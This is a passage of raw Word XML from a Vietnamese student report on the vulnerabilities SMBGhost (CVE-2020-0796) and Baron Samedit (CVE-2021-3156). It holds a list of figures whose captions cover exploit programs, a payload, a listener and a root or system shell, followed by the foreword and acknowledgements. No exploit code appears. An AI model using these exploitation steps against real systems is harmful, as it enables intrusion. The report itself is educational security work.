          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042062 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="210943FD" w14:textId="5D9D2913"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3" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 5 Các câu lệnh biên dịch file thực thi</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042063 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7B820E28" w14:textId="427A3D04"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4" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 6 Lấy được shell với quyền root sau khi chạy mã thực thi</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042064 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47661F26" w14:textId="7E8AD26F"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5" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 7 Mô hình thực nghiệm CVE-2020-0796</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042065 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="33C5D025" w14:textId="3E4BD70E"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6" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 8 Dò quét các VM trong vùng mạng nội bộ</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042066 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46CEDF07" w14:textId="5BECC67A"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7" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 9 Dò quét thông tin OS các VM</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042067 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>29</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="094EE33E" w14:textId="2832BE91"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8" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 10 Chương trình kiểm tra lỗ hổng SMBGhost</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042068 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>29</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="327070E1" w14:textId="3CEA63F8"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69" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 11 Kiểm tra khả năng khai thác lỗ hổng SMBGhost trên Target</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042069 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>30</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1EA739CA" w14:textId="1E7C3FBE"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70" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 12 Chương trình khai thác lỗ hổng SMBGhost</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042070 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>30</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1060A9E4" w14:textId="2F64CE6E"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71" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 13 Payload khai thác trên Windows 64-bit</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042071 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67624972" w14:textId="15F58B05"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72" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 14 Lắng nghe kết nối đến trên máy Attacker</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042072 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="40A88E67" w14:textId="2D8719A6"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73" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 15 Kết quả khai thác lỗ hổng SMBGhost</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042073 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D6BE627" w14:textId="3D34E155" w:rsidR="00F2370F" w:rsidRDefault="00F2370F">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84042074" w:history="1">
        <w:r w:rsidRPr="00B55AC3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hình 3. 16 RCE thành công với quyền system trên máy mục tiêu</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc184042074 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>34</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="541A2176" w14:textId="63238DB1" w:rsidR="00126DFF" w:rsidRPr="00EF61D2" w:rsidRDefault="00EF61D2" w:rsidP="00EF61D2">
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="007F7646">
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidR="007124C7">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="007124C7">
        <w:instrText xml:space="preserve"> TOC \h \z \c "Bảng 3." </w:instrText>
      </w:r>
      <w:r w:rsidR="007124C7">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CC00A6" w14:textId="2D7DAC5F" w:rsidR="001B52BE" w:rsidRDefault="007124C7" w:rsidP="001B52BE">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkStart w:id="4" w:name="_Toc185277762"/>
      <w:r w:rsidR="001B52BE">
        <w:t>LỜI NÓI ĐẦU</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="7C04A014" w14:textId="7FC78883" w:rsidR="00404722" w:rsidRPr="00404722" w:rsidRDefault="00404722" w:rsidP="00404722">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00404722">
        <w:rPr>
          <w:lang w:val="vi-VN" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>Trong bối cảnh an ninh mạng ngày càng trở thành một vấn đề quan trọng, việc phát hiện và khắc phục các lỗ hổng bảo mật là một nhiệm vụ không thể thiếu đối với các chuyên gia và tổ chức. Những lỗ hổng này có thể bị khai thác để tấn công hệ thống, gây ra thiệt hại nghiêm trọng nếu không được xử lý kịp thời. Trong đó, CVE-2020-0796 (SMBGhost) và CVE-2021-3156 (Baron Samedit) là hai lỗ hổng bảo mật nổi bật, gây ra nhiều lo ngại cho người dùng và các tổ chức toàn cầu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784AFE9E" w14:textId="00C0CEBB" w:rsidR="00404722" w:rsidRPr="00404722" w:rsidRDefault="00404722" w:rsidP="00404722">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00404722">
        <w:rPr>
          <w:lang w:val="vi-VN" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>CVE-2020-0796, hay còn gọi là SMBGhost, là một lỗ hổng nghiêm trọng trong giao thức SMBv3, cho phép kẻ tấn công thực thi mã độc từ xa mà không cần sự tương tác của người dùng. Lỗ hổng này có thể làm suy yếu an ninh của hệ thống, đặc biệt là đối với các máy chủ Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0AD296" w14:textId="59ED541D" w:rsidR="00404722" w:rsidRPr="00404722" w:rsidRDefault="00404722" w:rsidP="00404722">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00404722">
        <w:rPr>
          <w:lang w:val="vi-VN" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>CVE-2021-3156 (Baron Samedit) là một lỗ hổng trong công cụ sudo trên hệ điều hành Unix và Linux, cho phép kẻ tấn công vượt qua cơ chế phân quyền để thực thi các lệnh với quyền root mà không cần mật khẩu. Đây là một lỗ hổng có thể ảnh hưởng đến hàng triệu máy tính và thiết bị sử dụng hệ điều hành Linux và Unix.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37597BF0" w14:textId="3D03E823" w:rsidR="001D4BD6" w:rsidRDefault="00404722" w:rsidP="00404722">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00404722">
        <w:rPr>
          <w:lang w:val="vi-VN" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>Việc nghiên cứu, phân tích và hiểu rõ về các lỗ hổng bảo mật này không chỉ giúp chúng ta nâng cao nhận thức về nguy cơ mà còn cung cấp cơ sở để triển khai các biện pháp phòng ngừa hiệu quả, bảo vệ hệ thống khỏi các cuộc tấn công mạng tiềm ẩn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00FD0E1F" w:rsidRPr="00FD0E1F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6C8E37" w14:textId="4C200172" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="001B52BE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nội dung </w:t>
      </w:r>
      <w:r w:rsidR="00404722">
        <w:t>đề tài</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> có cấu trúc như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01987A33" w14:textId="71119FA0" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="005C249A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">CHƯƠNG 1: </w:t>
      </w:r>
      <w:r w:rsidR="00404722">
        <w:t>Cơ sở lý thuyết</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51949C11" w14:textId="52A6E9A8" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="005C249A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">CHƯƠNG 2: </w:t>
      </w:r>
      <w:r w:rsidR="00A95FEF">
        <w:t xml:space="preserve">Nghiên cứu </w:t>
      </w:r>
      <w:r w:rsidR="00404722">
        <w:t>về lỗ hổng</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D341217" w14:textId="4E4DE5DE" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="005C249A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>CHƯƠNG 3: T</w:t>
      </w:r>
      <w:r w:rsidR="00404722">
        <w:t>riển khai thực nghiệm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A6E075" w14:textId="0EB5DC6A" w:rsidR="001B52BE" w:rsidRDefault="00404722" w:rsidP="001B52BE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Chúng e</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t>m xin gửi lời cảm ơn chân thành tới các thầy cô học viện Kỹ thuật Mật mã đã nhiệt tình giảng dạy và truyền đạt kiến thức cho em trong quá trình học tập tại trường.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FDDC1E" w14:textId="42247534" w:rsidR="001B52BE" w:rsidRDefault="00645FDE" w:rsidP="001B52BE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Nhóm chúng e</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t xml:space="preserve">m xin gửi lời cảm ơn sâu sắc tới </w:t>
      </w:r>
      <w:r w:rsidR="005C249A">
        <w:t>thầy</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Lê Anh Tú</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00645FDE">
        <w:t>cảm ơn thầy đã tận tình theo sát và chỉ dẫn cho nhóm chúng em trong quá trình thực hiện đề tài này</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAD785B" w14:textId="1066378D" w:rsidR="00645FDE" w:rsidRDefault="00645FDE" w:rsidP="00645FDE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Trong quá trình tìm hiểu và thực hiện đề tài, nhóm chúng em xin chân thành cảm ơn các bạn trong lớp đã nhiệt tình góp ý và giúp đỡ nhóm rất nhiều. Những sự hỗ trợ đó đã giúp nhóm chúng em hoàn thành đề tài một cách tốt nhất có thể.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF24F26" w14:textId="30E4F7EF" w:rsidR="001B52BE" w:rsidRDefault="00645FDE" w:rsidP="00645FDE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Tuy nhiên, do kiến thức còn hạn chế, nhóm chúng em không thể tránh khỏi một số thiếu sót trong việc xây dựng thực nghiệm, trình bày cũng như các chi tiết kỹ thuật khác. Vì vậy, nhóm chúng em rất mong nhận được sự đóng góp, ý kiến phản hồi từ quý thầy cô để đề tài có thể hoàn thiện hơn và đạt được kết quả tốt nhất. Chúng em rất trân trọng sự hỗ trợ và góp ý của thầy cô trong suốt quá trình thực hiện đề tài này</w:t>
      </w:r>
      <w:r w:rsidR="001B52BE">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD3665B" w14:textId="09EC094F" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="001B52BE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Một lần nữa</w:t>
      </w:r>
      <w:r w:rsidR="00645FDE">
        <w:t xml:space="preserve"> nhóm chúng</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> em xin chân thành cảm ơn. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150A8D26" w14:textId="77777777" w:rsidR="001B52BE" w:rsidRDefault="001B52BE" w:rsidP="001B52BE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3425"/>
        <w:gridCol w:w="5644"/>
      </w:tblGrid>
      <w:tr w:rsidR="001B52BE" w:rsidRPr="004B7597" w14:paraId="0DB71D03" w14:textId="77777777" w:rsidTr="00DC736B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3544" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="50D5A759" w14:textId="77777777" w:rsidR="00C16909" w:rsidRPr="00C16909" w:rsidRDefault="00C16909" w:rsidP="00C16909">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="vi-VN" w:eastAsia="en-AU" w:bidi="th-TH"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5810" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="2F81D22E" w14:textId="040F9707" w:rsidR="001B52BE" w:rsidRPr="008B05CF" w:rsidRDefault="00645FDE" w:rsidP="00DC736B">
            <w:pPr>
              <w:pStyle w:val="Table-Center"/>
              <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="vi-VN"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
